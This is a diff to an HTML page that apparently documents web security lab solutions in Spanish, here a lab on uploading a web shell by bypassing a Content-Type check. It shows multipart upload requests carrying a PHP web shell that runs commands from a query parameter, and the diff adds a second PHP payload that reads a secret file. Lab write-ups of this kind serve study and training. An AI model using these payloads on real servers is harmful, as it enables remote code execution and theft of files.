@@ -56,7 +56,7 @@
       <h4 class="text-danger border-left-red mb-3"><i class="bi bi-2-circle"></i> Lab 2 — Web shell upload via Content-Type restriction bypass</h4>
       <p class="text-secondary">El servidor valida el <code>Content-Type</code> del multipart. Cambiar a <code>image/jpeg</code> para bypassear.</p>
       <div class="code-block mb-3">
-        <div class="code-header"><span class="text-success">POST /my-account/avatar</span></div>
+        <div class="code-header"><span class="text-success">POST /my-account/avatar — RCE payload</span></div>
         <pre><code>------WebKitFormBoundary1zH0L1Kdn5yMtB7c
 Content-Disposition: form-data; name="avatar"; filename="exploit.php"
 Content-Type: image/jpeg
@@ -64,7 +64,16 @@ Content-Type: image/jpeg
 &lt;?php echo system($_GET['cmd']); ?&gt;
 ------WebKitFormBoundary1zH0L1Kdn5yMtB7c</code></pre>
       </div>
-      <img src="img/file-upload/00.png" class="img-fluid rounded border border-secondary" alt="Content-Type bypass">
+      <img src="img/file-upload/00.png" class="img-fluid rounded border border-secondary mb-3" alt="Content-Type bypass">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">POST /my-account/avatar — File read payload</span></div>
+        <pre><code>------WebKitFormBoundaryvOOvSKhUgAvMsWE9
+Content-Disposition: form-data; name="avatar"; filename="image.php"
+Content-Type: image/jpeg
+
+&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
+------WebKitFormBoundaryvOOvSKhUgAvMsWE9</code></pre>
+      </div>
     </section>
 
     <!-- Lab 3 -->
